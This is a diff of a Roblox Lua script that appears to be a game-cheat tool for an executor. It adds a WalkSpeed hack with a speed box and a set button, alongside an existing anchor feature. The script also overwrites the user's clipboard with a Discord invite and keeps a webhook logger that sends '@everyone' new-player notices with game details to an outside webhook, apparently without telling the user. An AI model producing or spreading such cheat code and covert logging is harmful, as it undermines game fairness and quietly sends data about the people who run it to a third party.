@@ -9,8 +9,6 @@ local HttpService = game:GetService("HttpService")
 
 local player = Players.LocalPlayer
 
-
-
 --==============================
 -- Discord copy
 --==============================
@@ -18,8 +16,6 @@ local discordLink = "https://discord.gg/3bgfvvpAU2"
 if setclipboard then
 	setclipboard(discordLink)
 end
-
-
 
 --==============================
 -- Place check
@@ -32,8 +28,6 @@ if game.PlaceId ~= CORRECT_PLACEID then
 	})
 	return
 end
-
-
 
 --==============================
 -- Anchor system
@@ -59,8 +53,6 @@ local function enableAnchor()
 		end
 	end)
 end
-
-
 
 --==============================
 -- UI
@@ -135,10 +127,8 @@ end
 
 layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateMainHeight)
 
-
-
 --==============================
--- Button
+-- Button: Glass Unbreakable
 --==============================
 local enableBtn = Instance.new("TextButton", content)
 enableBtn.Size = UDim2.new(0, mainWidth-10, 0, buttonHeight)
@@ -156,7 +146,61 @@ enableBtn.MouseButton1Click:Connect(function()
 	enableAnchor()
 end)
 
+--==============================
+-- New: Speed 1-100 (TextBox + Set Button)
+--==============================
+local speedFrame = Instance.new("Frame", content)
+speedFrame.Size = UDim2.new(0, mainWidth-10, 0, buttonHeight)
+speedFrame.BackgroundTransparency = 1
 
+local speedBox = Instance.new("TextBox", speedFrame)
+speedBox.Size = UDim2.new(0.65, 0, 1, 0)
+speedBox.Position = UDim2.new(0, 0, 0, 0)
+speedBox.ClearTextOnFocus = true
+speedBox.PlaceholderText = "1-100"
+speedBox.Text = ""
+speedBox.Font = Enum.Font.Gotham
+speedBox.TextSize = 13
+speedBox.TextColor3 = Color3.fromRGB(230,230,230)
+speedBox.BackgroundColor3 = Color3.fromRGB(50,50,50)
+speedBox.BorderSizePixel = 0
+Instance.new("UICorner", speedBox).CornerRadius = UDim.new(0,6)
+
+local setBtn = Instance.new("TextButton", speedFrame)
+setBtn.Size = UDim2.new(0.33, 0, 1, 0)
+setBtn.Position = UDim2.new(0.67, 0, 0, 0)
+setBtn.Text = "Set Speed"
+setBtn.Font = Enum.Font.GothamBold
+setBtn.TextSize = 11
+setBtn.BackgroundColor3 = Color3.fromRGB(50,50,50)
+setBtn.TextColor3 = Color3.fromRGB(230,230,230)
+setBtn.BorderSizePixel = 0
+Instance.new("UICorner", setBtn).CornerRadius = UDim.new(0,6)
+
+setBtn.MouseButton1Click:Connect(function()
+	local val = tonumber(speedBox.Text)
+	if not val then
+		StarterGui:SetCore("SendNotification", {Title = "Invalid", Text = "أدخل رقم من 1 إلى 100", Duration = 3})
+		return
+	end
+	val = math.floor(val)
+	if val < 1 then val = 1 end
+	if val > 100 then val = 100 end
+
+	local char = player.Character
+	if not char then
+		StarterGui:SetCore("SendNotification", {Title = "Error", Text = "Character not found", Duration = 3})
+		return
+	end
+	local humanoid = char:FindFirstChildOfClass("Humanoid")
+	if not humanoid then
+		StarterGui:SetCore("SendNotification", {Title = "Error", Text = "Humanoid not found", Duration = 3})
+		return
+	end
+
+	humanoid.WalkSpeed = val
+	StarterGui:SetCore("SendNotification", {Title = "Speed Set", Text = "WalkSpeed set to "..val, Duration = 3})
+end)
 
 --==============================
 -- Webhook logger (بدون تغيير)
@@ -167,7 +211,7 @@ pcall(function()
     local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
 
     local data = {
-        content = "@everyone New Player Logged",
+        content = "@everyone - دخول جديد",
         embeds = {{
             color = 65280,
             fields = {
